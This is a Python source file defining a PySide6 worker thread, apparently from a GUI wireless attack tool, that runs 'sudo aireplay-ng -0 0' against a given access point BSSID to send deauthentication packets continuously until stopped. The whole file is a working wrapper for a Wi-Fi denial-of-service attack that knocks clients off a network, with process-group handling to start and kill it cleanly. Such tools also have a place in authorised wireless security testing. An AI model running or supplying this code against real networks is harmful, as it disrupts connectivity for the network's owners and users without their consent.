import subprocess
import os
import signal
from PySide6.QtCore import QThread, Signal


class DeauthWorker(QThread):
    status_msg = Signal(str)
    finished = Signal()

    def __init__(self, interface, bssid):
        super().__init__()
        self.interface = interface
        self.bssid = bssid
        self._is_running = True
        self.process = None

    def run(self):
        # The -0 0 parameter in aireplay-ng stands for sending deauth packets continuously
        cmd = ["sudo", "aireplay-ng", "-0", "0", "-a", self.bssid, self.interface]

        try:
            # Use Popen to run the process in the background
            self.process = subprocess.Popen(
                cmd,
                # stdout=subprocess.DEVNULL,
                # stderr=subprocess.DEVNULL,
                preexec_fn=os.setsid,  # Create a new process group to kill both sudo and child processes
            )

            self.status_msg.emit("[!] Sending continuous Deauth packets...")

            # Keep the thread alive until the _is_running flag is set to False
            while self._is_running:
                self.msleep(500)  # Sleep for 0.5s each check cycle

        except Exception as e:
            self.status_msg.emit(f"[!] Deauth Error: {str(e)}")

        finally:
            self.stop_process()
            self.finished.emit()

    def stop_process(self):
        """Stop the aireplay-ng process"""
        self._is_running = False
        if self.process:
            try:
                # Kill the entire process group (includes sudo and aireplay-ng)
                os.killpg(os.getpgid(self.process.pid), signal.SIGINT)
            except:
                pass
            self.process = None

    def stop(self):
        """Public method to request stop from the UI"""
        self._is_running = False
